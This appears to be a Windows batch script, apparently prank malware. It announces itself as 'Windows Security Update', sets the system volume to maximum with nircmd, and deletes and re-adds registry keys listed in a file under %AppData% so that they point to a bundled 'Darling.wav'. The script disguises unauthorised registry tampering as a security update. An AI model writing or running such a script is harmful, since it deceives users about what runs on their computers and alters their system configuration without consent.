@echo off
echo Windows Security Update...
nircmd.exe changesysvolume 65535

set pre_path=%AppData%\OniiChan
set music_name=Darling.wav

FOR /F "delims=, tokens=1" %%l IN (%pre_path%\registre_value.txt) DO (
    @rem l contain the REGISTRE KEY TO CHANGE
    @rem echo %%l
    REG DELETE %%l /f
    REG ADD %%l /t REG_SZ /d "%pre_path%\%music_name%" /f
)
